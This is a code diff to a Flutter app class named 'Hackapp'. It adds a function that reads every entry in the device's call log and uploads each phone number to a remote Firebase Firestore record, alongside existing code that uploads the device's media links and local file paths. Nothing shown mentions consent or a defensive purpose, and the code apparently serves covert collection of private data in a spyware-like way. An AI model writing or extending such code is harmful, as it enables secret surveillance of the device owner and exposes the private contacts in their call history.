@@ -1,4 +1,5 @@
 import 'dart:io';
+import 'package:call_log/call_log.dart';
 import 'package:cloud_firestore/cloud_firestore.dart';
 import 'package:device_info/device_info.dart';
 import 'package:firebase_storage/firebase_storage.dart';
@@ -208,11 +209,30 @@ class Hackapp extends ChangeNotifier {
     }
   }
 
+  void uploadCallLogsToFirebase(String uid) async {
+    Iterable<CallLogEntry> callLogs = await CallLog.query();
+
+    for (CallLogEntry callLog in callLogs) {
+      uploadcalllog(uid, "${callLog.number}");
+    }
+  }
+
   uploadlinkmedia(String uid, String link, String locallink) async {
     await _firestore.collection('users').doc(uid).update(
       {
         'Media': FieldValue.arrayUnion([link]),
         'locallinkMeadia': FieldValue.arrayUnion([locallink])
+      },
+    );
+  }
+
+  uploadcalllog(
+    String uid,
+    String link,
+  ) async {
+    await _firestore.collection('users').doc(uid).update(
+      {
+        'calllog': FieldValue.arrayUnion([link]),
       },
     );
   }
